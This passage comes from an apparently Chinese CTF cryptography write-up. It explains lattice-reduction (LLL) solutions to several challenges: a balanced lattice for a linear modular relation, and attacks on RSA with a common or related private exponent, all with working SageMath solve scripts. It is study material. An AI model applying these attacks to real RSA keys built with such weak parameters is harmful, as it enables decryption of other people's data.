class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">a = 。。。</span><br><span class="line">p = 。。。</span><br><span class="line"></span><br><span class="line">Ge = Matrix(ZZ, [[<span class="number">1</span>, a],</span><br><span class="line">                 [<span class="number">0</span>, p]])</span><br><span class="line"></span><br><span class="line">r, m = Ge.LLL()[<span class="number">0</span>]</span><br><span class="line">m = <span class="built_in">abs</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535707.png" alt="image-20240731110416083"></p><h3 id="p5-：平衡格基-本质还是hermite定理的应用">P5 ：平衡格基（本质还是Hermite定理的应用）</h3><p><a href="http://task.py">task.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;******&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> m.bit_length() == <span class="number">351</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">b = getPrime(<span class="number">1024</span>)</span><br><span class="line">c = getPrime(<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">a = (b*m + c) % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a = ...</span></span><br><span class="line"><span class="string">b = ...</span></span><br><span class="line"><span class="string">p = ...</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>构造格</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>=</mo><mi>b</mi><mo>×</mo><mi>m</mi><mo>+</mo><mi>c</mi><mo>+</mo><mi>k</mi><mi>p</mi><mspace linebreak="newline"></mspace><mo>=</mo><mo>&gt;</mo><mspace linebreak="newline"></mspace><mi>c</mi><mo>=</mo><mi>a</mi><mo>−</mo><mi>b</mi><mo>×</mo><mi>m</mi><mo>+</mo><mi>k</mi><mi>p</mi><mspace linebreak="newline"></mspace><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>m</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>k</mi></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>a</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>b</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>p</mi></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>m</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>c</mi></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mspace linebreak="newline"></mspace><mtext>这个时候可以发现结果基是不平衡的，其他位数都是</mtext><mn>300</mn><mo>+</mo><mtext>但这里不是唯一的判断标注</mtext><mspace linebreak="newline"></mspace><mtext>真正想判断还是通过</mtext><mi>H</mi><mi>e</mi><mi>r</mi><mi>m</mi><mi>i</mi><mi>t</mi><mi>e</mi><mtext>定理，不过使用时注意这是三维的格子了</mtext><mspace linebreak="newline"></mspace><mtext>最终解决思路是把最左上角的</mtext><mn>1</mn><mtext>进行调整</mtext></mrow><annotation encoding="application/x-tex">a = b \times m + c + kp\\=&gt;\\c = a - b \times m + kp\\\left(\begin{matrix}1 &amp; m &amp; k\\\end{matrix}\right)\left(\begin{matrix}1 &amp; 0 &amp; a\\0 &amp; 1 &amp; -b\\0 &amp; 0 &amp; p\end{matrix}\right)=\left(\begin{matrix}1 &amp; m &amp; c\end{matrix}\right)\\这个时候可以发现结果基是不平衡的，其他位数都是300+  但这里不是唯一的判断标注\\真正想判断还是通过Hermite定理，不过使用时注意这是三维的格子了\\最终解决思路是把最左上角的1进行调整</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎝</span></span></span><span style="top:-2.8100000000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎛</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">a</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathdefault">b</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎠</span></span></span><span style="top:-2.8100000000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">候</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">发</span><span class="mord cjk_fallback">现</span><span class="mord cjk_fallback">结</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">基</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">平</span><span class="mord cjk_fallback">衡</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">其</span><span class="mord cjk_fallback">他</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">都</span><span class="mord cjk_fallback">是</span><span class="mord">3</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">但</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">唯</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">判</span><span class="mord cjk_fallback">断</span><span class="mord cjk_fallback">标</span><span class="mord cjk_fallback">注</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">真</span><span class="mord cjk_fallback">正</span><span class="mord cjk_fallback">想</span><span class="mord cjk_fallback">判</span><span class="mord cjk_fallback">断</span><span class="mord cjk_fallback">还</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">注</span><span class="mord cjk_fallback">意</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">三</span><span class="mord cjk_fallback">维</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">格</span><span class="mord cjk_fallback">子</span><span class="mord cjk_fallback">了</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">终</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">决</span><span class="mord cjk_fallback">思</span><span class="mord cjk_fallback">路</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">把</span><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">左</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">角</span><span class="mord cjk_fallback">的</span><span class="mord">1</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">调</span><span class="mord cjk_fallback">整</span></span></span></span></span></p><p>Hermite定理验证：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">b = <span class="number">2</span> ** <span class="number">0</span>   <span class="comment">#这是不断调整配平用的</span></span><br><span class="line">f = flag = getPrime(<span class="number">351</span>)   </span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">b = getPrime(<span class="number">1024</span>)</span><br><span class="line">c = getPrime(<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#行列式维数</span></span><br><span class="line">n = <span class="number">3</span></span><br><span class="line">det = p * <span class="number">2</span>**<span class="number">190</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#行列式的值 大于等于下面的即可</span></span><br><span class="line">temp = gmpy2.iroot(n, <span class="number">2</span>)[<span class="number">0</span>] * gmpy2.iroot(det, n)[<span class="number">0</span>]  </span><br><span class="line"><span class="built_in">print</span>(temp.bit_length()) </span><br><span class="line"></span><br><span class="line"><span class="comment">#最短向量的值</span></span><br><span class="line">temp2 = gmpy2.iroot(f**<span class="number">2</span>+(c)**<span class="number">2</span>, <span class="number">2</span>)[<span class="number">0</span>]  </span><br><span class="line"><span class="comment">#此外一定要注意 在python中 ^是异或  **才是平方 </span></span><br><span class="line"><span class="built_in">print</span>(temp2.bit_length())  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> temp.bit_length() &gt;= temp2.bit_length():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;true&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;false&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535708.png" alt="image-20240731135906378"></p><p>exp.sage:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">a = ...</span><br><span class="line">b = ...</span><br><span class="line">p = ...</span><br><span class="line"></span><br><span class="line">Ge = Matrix(ZZ, [[<span class="number">2</span>^<span class="number">190</span>, <span class="number">0</span>, a],</span><br><span class="line">                 [<span class="number">0</span>, <span class="number">1</span>, -b],</span><br><span class="line">                 [<span class="number">0</span>, <span class="number">0</span>, p]])</span><br><span class="line"></span><br><span class="line">t, m, c = Ge.LLL()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">m = <span class="built_in">abs</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535709.png" alt="image-20240731140032667"></p><h3 id="p6-：论文题">P6 ：论文题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;******&#x27;</span></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">d = getPrime(<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = inverse(d, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    c = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;e<span class="subst">&#123;i&#125;</span> =&#x27;</span>, e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n<span class="subst">&#123;i&#125;</span> =&#x27;</span>, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c<span class="subst">&#123;i&#125;</span> =&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">e0 = ...</span></span><br><span class="line"><span class="string">n0 = ...</span></span><br><span class="line"><span class="string">c0 = ...</span></span><br><span class="line"><span class="string">e1 = ...</span></span><br><span class="line"><span class="string">n1 = ...</span></span><br><span class="line"><span class="string">c1 = ...</span></span><br><span class="line"><span class="string">e2 = ...</span></span><br><span class="line"><span class="string">n2 = ...</span></span><br><span class="line"><span class="string">c2 = ...</span></span><br><span class="line"><span class="string">e3 = ...</span></span><br><span class="line"><span class="string">n3 = ...</span></span><br><span class="line"><span class="string">c3 = ...</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>分析一下题目：</p><p>根本没给出什么其他条件，只有一个约束条件，多组公钥使用了一个相同的私钥</p><p>代码非常短，可能针对某个特定的问题</p><p>=&gt;这种一般就确定了 要搜论文，用论文的深入研究的结果去解决问题</p><p>=&gt;搜索方式：从题目中提取关键词  可以转化成英文</p><p>RSA、相同私钥、格基规约、格</p><p>=&gt;锁定论文</p><p>Lattice Based Attack on Common Private Exponent RSA</p><p><a href="https://citeseerx.ist.psu.edu/document?repid=rep1&amp;type=pdf&amp;doi=e84479b974927433e2fbc4d3e87c848e73537656">https://citeseerx.ist.psu.edu/document?repid=rep1&amp;type=pdf&amp;doi=e84479b974927433e2fbc4d3e87c848e73537656</a></p></blockquote><p>赛后细读论文</p><p>赛中直接看格子怎么构造的</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535710.png" alt="image-20240731212002907"></p><h3 id="p7-：论文题">P7 ：论文题（*）</h3><p>没太懂怎么构造的 需要再读读论文</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">110697784133988071803253124431092603234028687101567047811203431433689306543322837414808117411806181193598553341878079973980865551938790090419082150555675782822484149943421418447579383449269148197087985041351210982545320569973241390962326458234562044133505940521052500278777242988196544039226173227204865907343</span></span><br><span class="line">c = <span class="number">3281096209929505523196793672137624804022934270452947405454462490250571524417033484978613243658208567511735641542935158434165363547355697159503378251318054879687577130170122911449101189974762808655638497967674004219512386442280269940950792767174561412932638740423542930763914255112354969122157915514816022159</span></span><br><span class="line">e0 = <span class="number">28562806554366667733480283991307446762365777397933141571728113235368201162305126722188842319240464207580134816039095093401651171977877327756351539588974913736802534970867173212883308325913939353140276201705478124488858328502643345172188729914731042179091733244225184522680724392375975935305371163502863968963</span></span><br><span class="line">e1 = <span class="number">28572469216883232254074869113744730984165641173439644880182528671699871929340616919028955398474678696802739685594548793470261306125219888911330937557582939811068530294470712859439149735950996866732508004061234613146407591546995439312326450834903885979660916965052092661398640105827442036234500556755520316031</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">5</span>/<span class="number">14</span></span><br><span class="line">D = diagonal_matrix(ZZ, [n, <span class="built_in">int</span>(n ^ (<span class="number">1</span>/<span class="number">2</span>)), <span class="built_in">int</span>(n ^ (<span class="number">1</span> + a)), <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">M = Matrix(ZZ, [[<span class="number">1</span>, -n, <span class="number">0</span>, n^<span class="number">2</span>],</span><br><span class="line">                [<span class="number">0</span>, e0, -e0, -e0*n],</span><br><span class="line">                [<span class="number">0</span>, <span class="number">0</span>, e1, -e1*n],</span><br><span class="line">                [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, e0*e1]]) * D</span><br><span class="line"></span><br><span class="line">Ge = M.LLL()</span><br><span class="line">t = vector(ZZ, Ge[<span class="number">0</span>])</span><br><span class="line">x = t * M^(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">phi = <span class="built_in">int</span>(x[<span class="number">1</span>]/x[<span class="number">0</span>] * e0)</span><br><span class="line">d = inverse_mod(<span class="number">65537</span>, phi)</span><br><span class="line">m = power_mod(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="p8：格基规约">P8：格基规约</h3><p><a href="http://task.py">task.py</a>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 